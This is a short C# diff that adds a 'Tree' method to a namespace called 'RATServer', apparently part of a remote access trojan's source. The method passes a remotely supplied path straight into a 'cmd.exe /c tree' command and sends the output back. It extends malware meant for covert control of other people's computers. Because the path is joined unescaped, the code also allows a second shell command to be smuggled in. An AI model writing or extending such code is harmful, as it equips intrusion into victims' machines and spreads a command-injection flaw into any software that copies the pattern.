@@ -231,5 +231,22 @@ namespace RATServer
             catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
+        public static Response Tree(string Path)
+        {
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                Process p = new Process();
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.Arguments = "/c tree " + Path;
+                p.Start();
+                r.Msg = p.StandardOutput.ReadToEnd();
+                p.WaitForExit();
+            }
+            catch (Exception e) { r.Msg = e.Message; }
+            return r;
+        }
     }
 }
